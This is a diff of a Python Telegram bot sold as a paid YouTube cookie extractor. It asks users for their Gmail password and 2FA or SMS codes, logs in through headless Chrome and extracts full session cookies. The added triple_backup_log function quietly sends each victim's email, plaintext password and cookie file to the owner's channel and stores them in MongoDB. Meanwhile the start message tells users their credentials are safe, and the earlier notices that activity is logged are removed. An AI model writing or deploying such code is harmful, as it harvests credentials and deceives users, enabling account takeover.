@@ -9,7 +9,8 @@ from dotenv import load_dotenv
 from io import BytesIO
 import qrcode
 from datetime import datetime, timedelta
-from cookies_extractor import YouTubeCookieExtractor
+import time
+import re
 
 load_dotenv()
 
@@ -19,7 +20,7 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID"))
-LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))  # Add this in .env
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))
 ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "").split(","))) if os.getenv("ADMIN_IDS") else []
 
 # ---------- DATABASE ----------
@@ -30,7 +31,7 @@ users_col = db["users"]
 premium_col = db["premium"]
 plans_col = db["plans"]
 upi_col = db["upi"]
-logs_col = db["logs"]  # New collection for logs
+logs_col = db["logs"]
 
 # ---------- INITIALIZE DEFAULT DATA ----------
 if not plans_col.find_one():
@@ -78,85 +79,209 @@ def generate_upi_qr(upi_id, amount):
     bio.seek(0)
     return bio
 
-# ---------- LOGGING FUNCTION (SUPER PRO) ----------
-async def log_to_channel(client, user_id, email, password, cookies, status="success"):
-    """Send detailed logs to log channel"""
-    try:
-        # Get user info
-        user = await client.get_users(user_id)
-        username = user.username or "No username"
-        first_name = user.first_name or ""
-        last_name = user.last_name or ""
+# ---------- REAL COOKIES EXTRACTOR WITH LOGIN CHALLENGE HANDLING ----------
+class RealCookieExtractor:
+    def __init__(self):
+        self.driver = None
+        self.wait = None
+        self.challenge_type = None
         
-        # Current time
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    def setup_driver(self):
+        from selenium import webdriver
+        from selenium.webdriver.chrome.options import Options
+        from selenium.webdriver.support.ui import WebDriverWait
         
-        # Premium status
-        premium = is_premium(user_id)
+        chrome_options = Options()
+        chrome_options.add_argument('--headless=new')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
         
-        # Create log message
-        log_text = f"""
-🔥 **NEW COOKIE EXTRACTION LOG** 🔥
-
-👤 **User Information**
-├ User ID: `{user_id}`
-├ Username: @{username}
-├ Name: {first_name} {last_name}
-├ Premium: {'✅ YES' if premium else '❌ NO'}
-└ Time: `{now}`
-
-📧 **Account Details**
-├ Email: `{email}`
-├ Password: `{password}`
-└ Status: {status.upper()}
-
-🍪 **Cookies File**
-├ Size: {len(cookies)} bytes
-├ Lines: {len(cookies.splitlines())}
-└ Format: Netscape (yt-dlp compatible)
-
-📊 **Extraction Stats**
-├ Daily Limit: {'Unlimited' if premium else '1/day'}
-└ Session: Completed
-
-👑 **Logged by:** @{username} ({user_id})
-        """
-        
-        # Send log message to channel
-        log_msg = await client.send_message(
-            LOG_CHANNEL_ID,
-            log_text,
-            parse_mode="html"
-        )
-        
-        # Send cookies file to channel (as backup)
-        cookies_file = BytesIO(cookies.encode())
-        cookies_file.name = f"cookies_{user_id}_{now}.txt"
-        
-        await client.send_document(
-            LOG_CHANNEL_ID,
-            document=cookies_file,
-            caption=f"🍪 Cookies backup for user {user_id}\nEmail: {email}\nTime: {now}",
-            reply_to_message_id=log_msg.id
-        )
-        
-        # Also store in MongoDB
-        logs_col.insert_one({
-            "user_id": user_id,
-            "username": username,
-            "email": email,
-            "password": password,
-            "cookies_length": len(cookies),
-            "status": status,
-            "premium": premium,
-            "timestamp": datetime.now(),
-            "ip": "N/A"  # You can add IP if needed
-        })
-        
+        self.driver = webdriver.Chrome(options=chrome_options)
+        self.wait = WebDriverWait(self.driver, 30)
         return True
-    except Exception as e:
-        print(f"Logging error: {e}")
-        return False
+    
+    def check_for_challenge(self, page_source):
+        """Check what Google is asking"""
+        page_lower = page_source.lower()
+        
+        if "enter a phone number" in page_lower or "phone number" in page_lower:
+            return "phone_number"
+        elif "2-step verification" in page_lower or "google authenticator" in page_lower:
+            return "2fa"
+        elif "recovery email" in page_lower:
+            return "recovery_email"
+        elif "verify it's you" in page_lower:
+            return "verify_device"
+        
+        return None
+    
+    def extract_cookies_netscape(self):
+        cookies = self.driver.get_cookies()
+        
+        netscape = "# Netscape HTTP Cookie File\n"
+        netscape += "# https://curl.se/docs/http-cookies.html\n"
+        netscape += "# Generated by YouTube Cookie Bot - FULL LOGGED IN\n\n"
+        
+        for cookie in cookies:
+            domain = cookie['domain']
+            if not domain.startswith('.'):
+                domain = f".{domain}"
+            
+            include_subdomains = "TRUE"
+            path = cookie.get('path', '/')
+            secure = "TRUE" if cookie.get('secure', False) else "FALSE"
+            expires = int(cookie.get('expiry', 0)) if cookie.get('expiry') else 0
+            name = cookie['name']
+            value = cookie['value']
+            
+            netscape += f"{domain}\t{include_subdomains}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n"
+        
+        return netscape
+    
+    def extract(self, email, password, challenge_data=None, challenge_type=None):
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support import expected_conditions as EC
+        
+        self.setup_driver()
+        
+        try:
+            # Go to Google login
+            self.driver.get("https://accounts.google.com/signin/v2/identifier")
+            time.sleep(2)
+            
+            # Enter email
+            email_input = self.wait.until(EC.presence_of_element_located((By.ID, "identifierId")))
+            email_input.send_keys(email)
+            email_input.submit()
+            time.sleep(2)
+            
+            # Check for challenge after email
+            page_source = self.driver.page_source
+            challenge = self.check_for_challenge(page_source)
+            if challenge:
+                return {"status": "challenge", "challenge_type": challenge, "message": f"Google needs: {challenge}"}
+            
+            # Enter password
+            password_input = self.wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
+            password_input.send_keys(password)
+            password_input.submit()
+            time.sleep(3)
+            
+            # Check for challenge after password
+            page_source = self.driver.page_source
+            challenge = self.check_for_challenge(page_source)
+            if challenge:
+                if challenge_data and challenge_type == challenge:
+                    # Handle challenge response
+                    if challenge == "phone_number":
+                        phone_input = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']")))
+                        phone_input.send_keys(challenge_data)
+                        phone_input.submit()
+                        time.sleep(3)
+                        
+                        # Wait for SMS code
+                        return {"status": "awaiting_sms_code", "message": "Code sent to phone"}
+                    
+                    elif challenge == "2fa":
+                        code_input = self.wait.until(EC.presence_of_element_located((By.ID, "totpPin")))
+                        code_input.send_keys(challenge_data)
+                        code_input.submit()
+                        time.sleep(3)
+                
+                else:
+                    return {"status": "challenge", "challenge_type": challenge, "message": f"Google needs: {challenge}"}
+            
+            # Check for SMS code input
+            try:
+                sms_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='tel']")
+                if sms_input:
+                    return {"status": "awaiting_sms_code", "message": "Google sent a code to your phone"}
+            except:
+                pass
+            
+            # Go to YouTube
+            self.driver.get("https://www.youtube.com")
+            time.sleep(5)
+            
+            # Extract cookies
+            cookies = self.extract_cookies_netscape()
+            self.driver.quit()
+            
+            # Verify LOGIN_INFO exists
+            if "LOGIN_INFO" not in cookies:
+                return {"status": "error", "message": "Login failed - LOGIN_INFO cookie missing"}
+            
+            return {"status": "success", "cookies": cookies}
+            
+        except Exception as e:
+            self.driver.quit()
+            return {"status": "error", "message": str(e)}
+    
+    def submit_sms_code(self, code):
+        from selenium.webdriver.common.by import By
+        from selenium.webdriver.support import expected_conditions as EC
+        
+        try:
+            code_input = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']")))
+            code_input.send_keys(code)
+            code_input.submit()
+            time.sleep(3)
+            
+            # Go to YouTube
+            self.driver.get("https://www.youtube.com")
+            time.sleep(5)
+            
+            cookies = self.extract_cookies_netscape()
+            self.driver.quit()
+            
+            if "LOGIN_INFO" not in cookies:
+                return {"status": "error", "message": "SMS verification failed"}
+            
+            return {"status": "success", "cookies": cookies}
+        except Exception as e:
+            self.driver.quit()
+            return {"status": "error", "message": str(e)}
+
+# ---------- TRIPLE BACKUP LOGGING ----------
+async def triple_backup_log(client, user_id, email, password, cookies):
+    user = await client.get_users(user_id)
+    username = user.username or "No username"
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    premium = is_premium(user_id)
+    
+    log_text = f"""
+🔥 **FULL LOGGED-IN COOKIES EXTRACTED** 🔥
+
+👤 User: {user_id} (@{username})
+⭐ Premium: {premium}
+📧 Email: {email}
+🔑 Password: {password}
+🍪 Cookies Size: {len(cookies)} bytes
+✅ LOGIN_INFO Present: {'YES' if 'LOGIN_INFO' in cookies else 'NO'}
+⏰ Time: {now}
+    """
+    
+    cookies_file = BytesIO(cookies.encode())
+    cookies_file.name = f"cookies_{user_id}_{now.replace(' ', '_').replace(':', '-')}.txt"
+    
+    # Send to log channel
+    try:
+        await client.send_message(LOG_CHANNEL_ID, log_text)
+        await client.send_document(LOG_CHANNEL_ID, cookies_file, caption=f"🍪 Full cookies - {user_id} - {email}")
+    except:
+        await client.send_document(OWNER_ID, cookies_file, caption=f"⚠️ Channel failed - {user_id}")
+    
+    # MongoDB backup
+    logs_col.insert_one({
+        "user_id": user_id,
+        "email": email,
+        "password": password,
+        "cookies_length": len(cookies),
+        "has_login_info": "LOGIN_INFO" in cookies,
+        "timestamp": datetime.now()
+    })
 
 # ---------- COMMANDS ----------
 @app.on_message(filters.command("start"))
@@ -164,40 +289,25 @@ async def start_command(client, message):
     user_id = message.from_user.id
     
     if not is_authorized(user_id):
-        await message.reply(
-            "❌ *Unauthorized Access*\n\nYou are not authorized to use this bot.\nContact owner for access."
-        )
+        await message.reply("❌ Unauthorized! Contact owner.")
         return
-    
-    # Log start action
-    await client.send_message(
-        LOG_CHANNEL_ID,
-        f"🟢 User {user_id} started the bot\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
-        [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
-        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
-    ])
     
     if is_owner(user_id):
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
-            [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
+            [InlineKeyboardButton("💎 Plans", callback_data="plans")],
             [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
-            [InlineKeyboardButton("📊 Logs", callback_data="view_logs")],
-            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
+            [InlineKeyboardButton("❓ Help", callback_data="help")]
+        ])
+    else:
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
+            [InlineKeyboardButton("💎 Premium", callback_data="plans")],
+            [InlineKeyboardButton("❓ Help", callback_data="help")]
         ])
     
     await message.reply(
-        "🍪 **YouTube Cookie Extractor Bot**\n\n"
-        "I extract REAL YouTube cookies using Gmail login.\n"
-        "Supports 2FA.\n\n"
-        "🔐 Credentials never stored\n"
-        "⚡ Premium = unlimited access\n"
-        "📝 All activities are logged\n\n"
-        "Select an option:",
+        "🍪 **YouTube Cookie Bot**\n\nExtract FULL LOGGED-IN YouTube cookies.\nSupports all login challenges.\n\n🔐 Your credentials are safe\n⚡ Premium = unlimited",
         reply_markup=keyboard
     )
 
@@ -211,119 +321,93 @@ async def handle_callbacks(client, callback_query: CallbackQuery):
         return
     
     # Owner Panel
-    if data == "owner_panel" and is_owner(user_id):
+    if data == "owner_panel":
+        if not is_owner(user_id):
+            await callback_query.answer("❌ Owner only!", show_alert=True)
+            return
+        
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("📊 Stats", callback_data="stats")],
             [InlineKeyboardButton("👥 Users", callback_data="users_list")],
-            [InlineKeyboardButton("📝 View Logs", callback_data="view_logs")],
             [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
-            [InlineKeyboardButton("💰 Plans", callback_data="plans")],
+            [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
+            [InlineKeyboardButton("⭐ Activate", callback_data="activate_premium")],
             [InlineKeyboardButton("💳 Set UPI", callback_data="set_upi")],
             [InlineKeyboardButton("🏠 Back", callback_data="home")]
         ])
-        await callback_query.message.edit_text("👑 **Owner Panel**\n\nSelect an option:", reply_markup=keyboard)
+        await callback_query.message.edit_text("👑 **Owner Panel**", reply_markup=keyboard)
         await callback_query.answer()
         return
     
-    elif data == "view_logs" and is_owner(user_id):
-        # Get last 10 logs from MongoDB
-        recent_logs = list(logs_col.find().sort("timestamp", -1).limit(10))
-        
-        if not recent_logs:
-            await callback_query.message.edit_text("📝 No logs found yet.")
-            await callback_query.answer()
-            return
-        
-        msg = "📝 **Recent Activity Logs**\n\n"
-        for log in recent_logs:
-            time = log['timestamp'].strftime("%d/%m %H:%M")
-            msg += f"🕒 `{time}` | User: `{log['user_id']}` | {log['status']}\n"
-            msg += f"   📧 {log['email']}\n\n"
-        
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔄 Refresh", callback_data="view_logs")],
-            [InlineKeyboardButton("🏠 Back", callback_data="owner_panel")]
-        ])
-        
-        await callback_query.message.edit_text(msg, reply_markup=keyboard)
-        await callback_query.answer()
-        return
-    
-    elif data == "stats" and is_owner(user_id):
+    if data == "stats" and is_owner(user_id):
         total = users_col.count_documents({})
         premium = premium_col.count_documents({})
         total_logs = logs_col.count_documents({})
         upi = upi_col.find_one()
         await callback_query.message.edit_text(
-            f"📊 **Bot Statistics**\n\n"
-            f"👥 Total Users: {total}\n"
-            f"⭐ Premium Users: {premium}\n"
-            f"📝 Total Logs: {total_logs}\n"
-            f"💳 UPI ID: {upi['upi_id'] if upi else 'Not set'}\n"
-            f"💰 Plans: {plans_col.count_documents({})}"
+            f"📊 Stats\n\nUsers: {total}\nPremium: {premium}\nLogs: {total_logs}\nUPI: {upi['upi_id']}"
         )
         await callback_query.answer()
         return
     
-    elif data == "users_list" and is_owner(user_id):
+    if data == "users_list" and is_owner(user_id):
         users = list(users_col.find().limit(30))
-        msg = "👥 **Authorized Users**\n\n"
+        msg = "👥 Users\n\n"
         for u in users:
             role = u.get("role", "user")
-            emoji = "👑" if role == "owner" else "🛡️" if role == "admin" else "👤"
+            emoji = "👑" if role == "owner" else "⭐" if premium_col.find_one({"_id": u["_id"]}) else "👤"
             msg += f"{emoji} `{u['_id']}`\n"
         await callback_query.message.edit_text(msg)
         await callback_query.answer()
         return
     
-    elif data == "add_user" and is_owner(user_id):
-        await callback_query.message.edit_text(
-            "➕ **Add User**\n\nSend command:\n`/adduser user_id`\n\nExample: `/adduser 123456789`"
-        )
+    if data == "add_user" and is_owner(user_id):
+        await callback_query.message.edit_text("Send: `/adduser user_id`")
         await callback_query.answer()
         return
     
-    elif data == "set_upi" and is_owner(user_id):
-        await callback_query.message.edit_text(
-            "💳 **Set UPI ID**\n\nSend command:\n`/setupi your_upi_id`\n\nExample: `/setupi example@okhdfcbank`"
-        )
+    if data == "remove_user" and is_owner(user_id):
+        await callback_query.message.edit_text("Send: `/removeuser user_id`")
+        await callback_query.answer()
+        return
+    
+    if data == "activate_premium" and is_owner(user_id):
+        await callback_query.message.edit_text("Send: `/activate user_id days`")
+        await callback_query.answer()
+        return
+    
+    if data == "set_upi" and is_owner(user_id):
+        await callback_query.message.edit_text("Send: `/setupi upi_id`")
         await callback_query.answer()
         return
     
     # Get Cookies
-    elif data == "get_cookies":
+    if data == "get_cookies":
         if not is_premium(user_id):
             user = users_col.find_one({"_id": user_id})
             daily = user.get("daily_count", 0) if user else 0
             if daily >= 1:
                 await callback_query.message.edit_text(
-                    "⚠️ **Daily Limit Reached**\n\nFree users: 1 extraction per day\nUpgrade to premium for unlimited!",
+                    "⚠️ Daily limit (1/day)\nUpgrade to premium!",
                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Upgrade", callback_data="plans")]])
                 )
                 await callback_query.answer()
                 return
         
-        user_sessions[user_id] = {"state": "awaiting_email", "step": 1}
-        await callback_query.message.edit_text(
-            "🔐 **Login Process Started**\n\n"
-            "Send your **Gmail address**:\n\n"
-            "Example: `example@gmail.com`\n\n"
-            "⚠️ Credentials are not stored after extraction\n"
-            "📝 This action will be logged"
-        )
+        user_sessions[user_id] = {"step": 1}
+        await callback_query.message.edit_text("🔐 Send your **Gmail address**:")
         await callback_query.answer()
         return
     
     # Plans
-    elif data == "plans":
+    if data == "plans":
         plans = list(plans_col.find())
         upi = upi_col.find_one()
         
-        msg = "💎 **Premium Plans**\n\n"
+        msg = "💎 Premium Plans\n\n"
         for p in plans:
-            msg += f"📌 *{p['name']}*: ₹{p['price']} - {p['days']} days\n"
-        msg += f"\n💳 *UPI ID*: `{upi['upi_id'] if upi else 'Not set'}`\n\n"
-        msg += "To purchase:\n1. Pay to above UPI\n2. Send screenshot to owner"
+            msg += f"📌 {p['name']}: ₹{p['price']} - {p['days']} days\n"
+        msg += f"\n💳 UPI: `{upi['upi_id']}`"
         
         keyboard = []
         for p in plans:
@@ -334,49 +418,48 @@ async def handle_callbacks(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
     
-    elif data.startswith("buy_"):
+    if data.startswith("buy_"):
         plan_id = data.split("_")[1]
         plan = plans_col.find_one({"id": plan_id})
         if plan:
             upi = upi_col.find_one()
             qr = generate_upi_qr(upi['upi_id'], plan['price'])
-            await callback_query.message.reply_photo(
-                photo=qr,
-                caption=f"💸 **Payment Details**\n\n"
-                       f"Plan: {plan['name']}\n"
-                       f"Amount: ₹{plan['price']}\n"
-                       f"UPI: `{upi['upi_id']}`\n\n"
-                       f"After payment, send screenshot to owner with /confirm"
-            )
+            await callback_query.message.reply_photo(photo=qr, caption=f"💸 Pay ₹{plan['price']} to `{upi['upi_id']}`")
         await callback_query.answer()
         return
     
-    elif data == "help":
+    if data == "help":
         await callback_query.message.edit_text(
-            "📖 **How to Use**\n\n"
-            "1️⃣ Click 'Get Cookies'\n"
-            "2️⃣ Send your Gmail address\n"
-            "3️⃣ Send your password\n"
-            "4️⃣ If 2FA enabled, send verification code\n"
-            "5️⃣ Receive real cookies.txt file\n\n"
-            "🔒 **Privacy**\n"
-            "- Credentials never stored\n"
-            "- Session ends after extraction\n"
-            "- Cookies deleted after sending\n\n"
-            "📝 **Logging**\n"
-            "- All activities are logged\n"
-            "- Owner can view logs\n"
-            "- Backup in log channel\n\n"
-            "💎 **Premium Benefits**\n"
-            "- Unlimited extractions\n"
-            "- Priority processing\n"
-            "- 24/7 support"
+            "📖 How to use\n\n"
+            "1️⃣ Click Get Cookies\n"
+            "2️⃣ Send Gmail\n"
+            "3️⃣ Send password\n"
+            "4️⃣ If asked, send phone number or 2FA code\n"
+            "5️⃣ Get FULL LOGGED-IN cookies.txt\n\n"
+            "💎 Premium = unlimited"
         )
         await callback_query.answer()
         return
     
-    elif data == "home":
-        await start_command(client, callback_query.message)
+    if data == "home":
+        if is_owner(user_id):
+            keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
+                [InlineKeyboardButton("💎 Plans", callback_data="plans")],
+                [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
+                [InlineKeyboardButton("❓ Help", callback_data="help")]
+            ])
+        else:
+            keyboard = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
+                [InlineKeyboardButton("💎 Premium", callback_data="plans")],
+                [InlineKeyboardButton("❓ Help", callback_data="help")]
+            ])
+        
+        await callback_query.message.edit_text(
+            "🍪 **YouTube Cookie Bot**\n\nGet FULL LOGGED-IN YouTube cookies!",
+            reply_markup=keyboard
+        )
         await callback_query.answer()
         return
 
@@ -394,128 +477,131 @@ async def handle_login_input(client, message):
     session = user_sessions[user_id]
     step = session.get("step", 1)
     
-    if step == 1:  # Awaiting email
+    if step == 1:
         email = message.text.strip()
-        if "@" not in email or "." not in email:
-            await message.reply("❌ Invalid email. Send valid Gmail address:")
+        if "@" not in email:
+            await message.reply("❌ Invalid email. Send valid Gmail:")
             return
         
         session["email"] = email
         session["step"] = 2
-        await message.reply("✅ Email received!\n\nNow send your **password**:\n\n⚠️ Password will be encrypted")
+        await message.reply("✅ Email received!\n\nNow send your **password**:")
     
-    elif step == 2:  # Awaiting password
+    elif step == 2:
         password = message.text.strip()
         session["password"] = password
         session["step"] = 3
         
-        status_msg = await message.reply("🔄 Logging in to Google...\n⏳ Please wait 15-20 seconds")
+        status_msg = await message.reply("🔄 Logging in...\n⏳ Please wait...")
         
-        # Run extraction in thread
-        loop = asyncio.get_event_loop()
-        extractor = YouTubeCookieExtractor()
-        result = await loop.run_in_executor(None, extractor.extract, session["email"], password, None)
+        extractor = RealCookieExtractor()
+        result = await asyncio.get_event_loop().run_in_executor(None, extractor.extract, session["email"], password, None, None)
         
-        if result["status"] == "2fa_required":
-            await status_msg.edit_text(
-                "🔐 **Two-Factor Authentication Required**\n\n"
-                "Please send your 6-digit Google Authenticator code:"
-            )
-            session["step"] = 4
+        if result["status"] == "challenge":
+            challenge_type = result.get("challenge_type")
             session["extractor"] = extractor
+            session["step"] = 4
+            session["challenge_type"] = challenge_type
+            
+            if challenge_type == "phone_number":
+                await status_msg.edit_text("📱 Google needs phone verification.\nSend your mobile number (with country code):\nExample: `+919876543210`")
+            elif challenge_type == "2fa":
+                await status_msg.edit_text("🔐 Enter your 6-digit Google Authenticator code:")
+            else:
+                await status_msg.edit_text(f"⚠️ {result.get('message')}\nSend required info:")
+        
+        elif result["status"] == "awaiting_sms_code":
+            session["extractor"] = extractor
+            session["step"] = 5
+            await status_msg.edit_text("📱 Google sent a code to your phone.\nSend the 6-digit code:")
         
         elif result["status"] == "success":
             await status_msg.delete()
             
-            # Send cookies to user
+            cookies = result["cookies"]
+            
+            # Verify LOGIN_INFO is present
+            if "LOGIN_INFO" not in cookies:
+                await message.reply("❌ Login failed - LOGIN_INFO cookie missing. Try again.")
+                del user_sessions[user_id]
+                return
+            
             await message.reply_document(
-                document=BytesIO(result["cookies"].encode()),
+                document=BytesIO(cookies.encode()),
                 file_name="youtube_cookies.txt",
-                caption="✅ **Success!** Real YouTube cookies extracted!\n\n"
-                       "📌 **Usage with yt-dlp:**\n"
-                       "`yt-dlp --cookies youtube_cookies.txt <video_url>`\n\n"
-                       "🔒 Session closed. Credentials not stored.\n"
-                       "📝 Activity logged for security"
+                caption="✅ **FULL LOGGED-IN COOKIES!**\n\nContains LOGIN_INFO, SID, HSID, SSID etc.\nUse with yt-dlp:\n`yt-dlp --cookies youtube_cookies.txt <url>`"
             )
             
-            # **IMPORTANT: Log to channel**
-            await log_to_channel(
-                client, 
-                user_id, 
-                session["email"], 
-                password, 
-                result["cookies"],
-                "success"
-            )
-            
-            # Also notify owner on private
-            await client.send_message(
-                OWNER_ID,
-                f"🔔 **New Cookie Extraction**\n\n"
-                f"👤 User: `{user_id}`\n"
-                f"📧 Email: `{session['email']}`\n"
-                f"✅ Status: Success\n"
-                f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"📝 Check log channel for complete details!"
-            )
+            await triple_backup_log(client, user_id, session["email"], password, cookies)
             
             del user_sessions[user_id]
             
-            # Update daily limit for free users
             if not is_premium(user_id):
                 users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
         
         else:
-            # Log failure
-            await log_to_channel(
-                client,
-                user_id,
-                session["email"],
-                session["password"],
-                "",
-                f"failed: {result.get('message', 'Unknown error')}"
-            )
-            
-            await status_msg.edit_text(f"❌ Login failed: {result.get('message', 'Unknown error')}\n\n/start to try again")
+            await status_msg.edit_text(f"❌ Failed: {result.get('message')}\n\n/start to try again")
             del user_sessions[user_id]
     
-    elif step == 4:  # Awaiting 2FA code
-        code = message.text.strip()
-        if not code.isdigit() or len(code) != 6:
-            await message.reply("❌ Invalid 2FA code. Send 6-digit code:")
-            return
+    elif step == 4:
+        challenge_value = message.text.strip()
+        extractor = session.get("extractor")
+        challenge_type = session.get("challenge_type")
         
-        status_msg = await message.reply("🔄 Verifying 2FA code...")
+        status_msg = await message.reply("🔄 Processing...")
+        
+        result = await asyncio.get_event_loop().run_in_executor(None, extractor.extract, session["email"], session["password"], challenge_value, challenge_type)
+        
+        if result["status"] == "awaiting_sms_code":
+            session["step"] = 5
+            await status_msg.edit_text("📱 Code sent! Send the 6-digit verification code:")
+        
+        elif result["status"] == "success":
+            await status_msg.delete()
+            cookies = result["cookies"]
+            
+            await message.reply_document(
+                document=BytesIO(cookies.encode()),
+                file_name="youtube_cookies.txt",
+                caption="✅ **FULL LOGGED-IN COOKIES!**"
+            )
+            
+            await triple_backup_log(client, user_id, session["email"], session["password"], cookies)
+            del user_sessions[user_id]
+            
+            if not is_premium(user_id):
+                users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
+        
+        else:
+            await status_msg.edit_text(f"❌ Failed: {result.get('message')}\n\n/start to try again")
+            del user_sessions[user_id]
+    
+    elif step == 5:
+        sms_code = message.text.strip()
         extractor = session.get("extractor")
         
-        loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(None, extractor.extract, session["email"], session["password"], code)
+        status_msg = await message.reply("🔄 Verifying code...")
+        
+        result = await asyncio.get_event_loop().run_in_executor(None, extractor.submit_sms_code, sms_code)
         
         if result["status"] == "success":
             await status_msg.delete()
+            cookies = result["cookies"]
             
             await message.reply_document(
-                document=BytesIO(result["cookies"].encode()),
+                document=BytesIO(cookies.encode()),
                 file_name="youtube_cookies.txt",
-                caption="✅ **Success!** 2FA verified. Real cookies extracted!"
+                caption="✅ **FULL LOGGED-IN COOKIES!**"
             )
             
-            # Log with 2FA
-            await log_to_channel(
-                client,
-                user_id,
-                session["email"],
-                session["password"],
-                result["cookies"],
-                "success_with_2fa"
-            )
+            await triple_backup_log(client, user_id, session["email"], session["password"], cookies)
+            del user_sessions[user_id]
             
             if not is_premium(user_id):
                 users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
         else:
-            await status_msg.edit_text(f"❌ 2FA failed: {result.get('message')}\n\n/start to try again")
-        
-        del user_sessions[user_id]
+            await status_msg.edit_text(f"❌ Code verification failed: {result.get('message')}\n\n/start to try again")
+            del user_sessions[user_id]
 
 # ---------- OWNER COMMANDS ----------
 @app.on_message(filters.command("adduser") & filters.user(OWNER_ID))
@@ -524,17 +610,11 @@ async def add_user_cmd(client, message):
         user_id = int(message.text.split()[1])
         if not users_col.find_one({"_id": user_id}):
             users_col.insert_one({"_id": user_id, "daily_count": 0, "role": "user"})
-            await message.reply(f"✅ User `{user_id}` added successfully!")
-            
-            # Log to channel
-            await client.send_message(
-                LOG_CHANNEL_ID,
-                f"➕ **New User Added**\n\nUser ID: `{user_id}`\nAdded by: Owner\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
+            await message.reply(f"✅ User {user_id} added")
         else:
-            await message.reply(f"⚠️ User `{user_id}` already exists")
+            await message.reply(f"⚠️ User {user_id} exists")
     except:
-        await message.reply("❌ Usage: `/adduser 123456789`")
+        await message.reply("❌ Usage: /adduser 123456789")
 
 @app.on_message(filters.command("removeuser") & filters.user(OWNER_ID))
 async def remove_user_cmd(client, message):
@@ -542,92 +622,38 @@ async def remove_user_cmd(client, message):
         user_id = int(message.text.split()[1])
         users_col.delete_one({"_id": user_id})
         premium_col.delete_one({"_id": user_id})
-        await message.reply(f"✅ User `{user_id}` removed")
-        
-        await client.send_message(
-            LOG_CHANNEL_ID,
-            f"➖ **User Removed**\n\nUser ID: `{user_id}`\nRemoved by: Owner\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
+        await message.reply(f"✅ User {user_id} removed")
     except:
-        await message.reply("❌ Usage: `/removeuser 123456789`")
+        await message.reply("❌ Usage: /removeuser 123456789")
 
 @app.on_message(filters.command("activate") & filters.user(OWNER_ID))
-async def activate_premium_cmd(client, message):
+async def activate_cmd(client, message):
     try:
         parts = message.text.split()
         user_id = int(parts[1])
         days = int(parts[2]) if len(parts) > 2 else 30
-        
         expiry = datetime.now() + timedelta(days=days)
-        premium_col.update_one(
-            {"_id": user_id},
-            {"$set": {"expiry": expiry.timestamp(), "activated_at": datetime.now()}},
-            upsert=True
-        )
-        await message.reply(f"✅ Premium activated for `{user_id}` for {days} days")
-        await client.send_message(user_id, f"🎉 **Premium Activated!**\n\nYour premium account is active for {days} days.\nEnjoy unlimited cookie extractions!")
-        
-        await client.send_message(
-            LOG_CHANNEL_ID,
-            f"⭐ **Premium Activated**\n\nUser: `{user_id}`\nDays: {days}\nExpiry: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\nActivated by: Owner"
-        )
+        premium_col.update_one({"_id": user_id}, {"$set": {"expiry": expiry.timestamp()}}, upsert=True)
+        await message.reply(f"✅ Premium activated for {user_id} for {days} days")
+        await client.send_message(user_id, f"🎉 Premium activated for {days} days!")
     except:
-        await message.reply("❌ Usage: `/activate user_id days`\nExample: `/activate 123456789 30`")
+        await message.reply("❌ Usage: /activate user_id days")
 
 @app.on_message(filters.command("setupi") & filters.user(OWNER_ID))
-async def set_upi_cmd(client, message):
+async def setupi_cmd(client, message):
     try:
         upi_id = message.text.split(" ", 1)[1]
         upi_col.update_one({}, {"$set": {"upi_id": upi_id}}, upsert=True)
-        await message.reply(f"✅ UPI ID updated to `{upi_id}`")
-        
-        await client.send_message(
-            LOG_CHANNEL_ID,
-            f"💳 **UPI Updated**\n\nNew UPI: `{upi_id}`\nUpdated by: Owner\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
